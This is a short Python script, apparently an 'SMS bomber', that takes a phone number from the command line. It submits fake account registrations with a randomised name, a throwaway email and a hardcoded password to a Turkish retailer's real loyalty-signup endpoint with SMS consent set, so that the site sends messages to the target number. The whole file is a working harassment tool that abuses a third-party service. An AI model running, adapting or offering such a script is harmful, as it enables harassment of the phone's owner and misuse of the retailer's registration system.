import requests
import random,string
import sys
phone2 = sys.argv[1]
def smsboom(phone):
  name = "Koko" + string.ascii_lowercase[random.randint(0,9)] 
  headerss = {
      "User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
    }
  data = {
    "first_name":f"{name}",
    "last_name":f"{name}",
    "email":f"{name}@gmail.com",
    "phone":f"{phone}",
    "dob_day":"02",
    "dob_month":"06",
    "dob_year":"1995",
    "":"1995-06-02",
    "gender":"male",
    "password":"Gokay@121$uct",
    "add_loyalty":"true",
    "email_allowed":"true",
    "sms_allowed":"true",
    "confirm":"true"
  }
  r = requests.post("https://www.mudo.com.tr/users/register-with-loyalty/", data=data, headers=headerss)
  if "first_name" in r.text:
    print("Basarili")
  else:
    print("hata")
from multiprocessing import Process



if __name__ == '__main__':
    p = Process(target=smsboom, args=(f'{phone2}',))
    p.start()
    p.join()